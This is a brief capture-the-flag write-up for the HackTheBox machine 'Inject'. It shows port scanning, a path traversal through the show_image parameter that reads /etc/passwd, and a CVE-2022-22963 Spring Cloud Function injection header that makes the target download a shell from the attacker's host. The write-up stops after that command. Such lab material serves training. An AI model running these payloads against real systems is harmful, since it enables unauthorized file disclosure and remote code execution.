# HackTheBox - Inject (Easy)

TARGET=10.10.11.204

## Port Scan

I was using `naabu` from @projectdiscovery because `nmap` full port was taking too much time.

```
~/go/bin/naabu -host 10.10.11.204 -p - -Pn -verbose
```

![naabu-result](https://github.com/xchopath/www.novr.one/assets/44427665/23fd7c5e-52a0-42bb-848c-54d9b78f15e5)

After scan with `naabu` now use `nmap` service scan with specific port.

```
nmap -p 22,8080 -Pn -sV -sC 10.10.11.204 -vvv
```

![nmap -sV -sC](https://github.com/xchopath/www.novr.one/assets/44427665/4de32715-7c15-4a1e-b755-f25aa6ab8839)

Discovered Ports:

| Port | Service |
|------|---------|
|  22  |   SSH   |
| 8080 |   HTTP  |

## Port 8080

After Recon all functionality, There found `show_image` is exploitable.

```
curl -s "http://10.10.11.204:8080/show_image?img=../../../../../../etc/passwd"
```

![image](https://github.com/xchopath/www.novr.one/assets/44427665/072b1ac5-c01a-4de6-b409-a339662f0cee)

## CVE-2022-22963 (Spring Cloud Function - RCE)

```
curl -X POST "http://10.10.11.204:8080/functionRouter" -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("wget http://10.10.14.70:8000/shell -O /tmp/shell")' --data-raw 'data' -v
```
